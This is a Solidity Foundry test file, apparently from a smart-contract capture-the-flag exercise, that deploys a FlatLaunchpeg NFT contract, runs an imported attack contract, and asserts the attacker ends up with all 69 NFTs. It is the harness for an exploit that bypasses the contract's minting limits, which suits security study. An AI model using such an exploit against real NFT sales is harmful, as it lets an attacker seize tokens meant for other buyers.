// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Attack.sol";
import "../src/FlatLaunchpeg.sol";


interface CheatCodes {
   // Gets address for a given private key, (privateKey) => (address)
   function addr(uint256) external returns (address);
}
contract AttackTest is Test {

    FlatLaunchpeg flatLaunchpeg;
    attack attackContract;
    
    // Gets us accounts to interact with in foundry
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    address attacker = cheats.addr(1);
    
    //keep track of the blocknumber as its used in the assertions
    uint256 blockNumber;
    
    
    function setUp() public {
        flatLaunchpeg = new FlatLaunchpeg(69,5,5);
        blockNumber = block.number;        
    }

    function testNFTGrab() public {
    
        // what is the total supply of NFTs before minting
        console.log("======================================");
        console.log("[+] TotalSupply before attack : ", flatLaunchpeg.totalSupply());
        console.log("======================================");
        // what is the attackers NFT balance before the attack
        console.log("======================================");
        console.log("[+] NFT balance of attacker brfore attack :", flatLaunchpeg.balanceOf(attacker));
        console.log("======================================");
        
        // now instantiate our attack contract to do the attack in the constructor
        attackContract = new attack(address(flatLaunchpeg),attacker);
        
        // roll the blocknumber forward by 1 no sure why but it's 
        // in the original test
        vm.roll(blockNumber+1);
        
        // print out values after the attack
        console.log("======================================");
        console.log("[+] NFT balance of attacker : ", flatLaunchpeg.balanceOf(attacker));
        console.log("======================================");
        console.log("======================================");
        console.log("[+] TotalSupply after attack : ", flatLaunchpeg.totalSupply());
        console.log("======================================");

        //assertions to check if our attack worked
        assertEq(flatLaunchpeg.totalSupply(), 69);
        assertEq(flatLaunchpeg.balanceOf(attacker), 69);
        assertEq(block.number, blockNumber+1);
    }

}
